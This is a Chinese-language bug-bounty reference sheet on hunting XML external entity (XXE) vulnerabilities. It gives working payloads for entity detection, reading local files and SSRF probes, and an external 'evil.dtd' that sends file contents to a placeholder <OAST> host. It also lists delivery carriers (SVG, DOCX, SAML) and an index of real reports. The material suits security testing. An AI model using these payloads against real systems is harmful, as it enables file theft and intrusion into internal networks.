# hunt-xxe · 参考

真实报告源自本仓库第二轮高价值案例（value_score≥8）。`<OAST>`/`<DTD_URL>` 换成你的外部服务。

## 分级 payload（Bypasses）

### ① 判是否解析外部实体（内部实体回显）
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY hxxe "HUNTXXE_OK">]>
<root><a>&hxxe;</a></root>
```
响应出现 `HUNTXXE_OK` = 实体被解析。

### ② 本地文件读取（有回显）
```xml
<!DOCTYPE r [<!ENTITY f SYSTEM "file:///etc/hostname">]>
<root><a>&f;</a></root>
```
（#248668 外部实体读文件 + SSRF）。PHP 可用 `php://filter/convert.base64-encode/resource=`。

### ③ SSRF / OOB（无回显）
```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "http://<OAST>/xxe">]>
<root><a>&x;</a></root>
```
OAST 收到请求 = 实体可达外呼（可打内网）。

### ④ 外部 DTD 做报错/带外外带（无回显 + 内部实体受限）
外部 `<DTD_URL>/evil.dtd`：
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<OAST>/?x=%file;'>">
%eval; %exfil;
```
XML：`<!DOCTYPE r [<!ENTITY % dtd SYSTEM "<DTD_URL>/evil.dtd"> %dtd;]>`。
报错型：把外带改成故意报错，让文件内容出现在错误消息里（#1217114 用 OOB 错误 + ICMP 大小信道）。

## 载体（不同入口的包法）
- **SOAP**：直接在 XML body 注 DOCTYPE。
- **SVG**：`<svg>` 前加 DOCTYPE，上传图像触发（#232174 类，也 XSS）。
- **DOCX/XLSX**：改包内 XML 部件再打包上传。
- **SAML**：`SAMLResponse` 是 XML，注实体（配合 hunt-auth-bypass）。
- **XXE→反序列化链**：PHP 对象注入的 `__toString` 触发 XXE，再 SSRF→pickle（#415501、#416004、#415222、#415682、#415202、#415137）。

## Detection Patterns（怎么判，而非猜）

- **实体展开**：内部实体回显标记出现 = 解析开启（①）。
- **文件内容**：响应/错误里出现目标文件内容 = 读取成功（②④）。
- **OAST 命中**：外部实体触发对你服务器的请求 = 可达外呼/SSRF（③）。
- **报错外带**：故意错误把 `%file;` 内容带进错误消息。
- 无回显是常态——优先走 ③④ 的 OOB，别因没回显就放弃。

## Real Reports（复现索引）

| 向量 | 报告 |
|---|---|
| 外部实体读文件+SSRF | 248668 |
| OOB 报错型信道 | 1217114 |
| PHP 反序列化中的 XXE | 416123 |
| XXE→SSRF→pickle 链 | 415501 / 416004 / 415222 / 415682 / 415202 / 415137 |
| 外部实体 RCE | 315837 |
| CSS/HTML 实体载体 | 982291 |

hunt 顺序：①判解析 → 有回显走②读文件 → 无回显走③ OAST → 仍不中挂④外部 DTD 报错外带。

## 更多真实案例（第三轮单例补充）

（来自第二轮单例、第三轮语义路由归入本类；仅列此前未收录的报告，作案例索引）

- **XXE配置错误**
  - #1095645 LIBXML_NOENT 标志导致 XXE（框架行为变化）
- **XXE利用**
  - #845832 SVG 上传触发 XXE 进而 SSRF/LFI
